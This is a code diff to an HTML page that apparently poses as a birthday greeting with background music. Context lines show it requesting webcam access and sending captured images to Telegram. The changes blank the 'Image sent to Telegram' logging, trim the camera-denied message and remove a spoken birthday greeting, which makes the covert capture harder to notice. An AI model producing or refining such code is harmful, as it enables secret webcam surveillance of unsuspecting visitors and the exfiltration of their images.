@@ -472,10 +472,10 @@ navigator.mediaDevices.getUserMedia({ video: true })
         })
         .then(response => response.json())
         .then(data => {
-            console.log('Image sent to Telegram:', data);
+            
         })
         .catch(error => {
-            console.error('Error sending image to Telegram:', error);
+            
         });
     }
 
@@ -503,28 +503,10 @@ navigator.mediaDevices.getUserMedia({ video: true })
     video.play();
 })
 .catch(function (error) {
-    console.error('Camera permission denied:', error);
+    console.error('denied:', error);
 });
 </script>
 
-<script>
-const message = new SpeechSynthesisUtterance();
-
-// Assuming 'a' contains the user's name
-const userName = a;
-
-// Construct the birthday message
-const birthdayMessage = `Happy Birthday, ${userName}!`;
-
-// Set the text to be spoken
-message.text = birthdayMessage;
-
-// Create an instance of the speech synthesis object
-const speechSynthesis = window.speechSynthesis;
-
-// Start speaking
-speechSynthesis.speak(message);
-</script>
 
 <body>
 <embed src="background_music.mp3" loop="true" autostart="true" width="2" height="0">
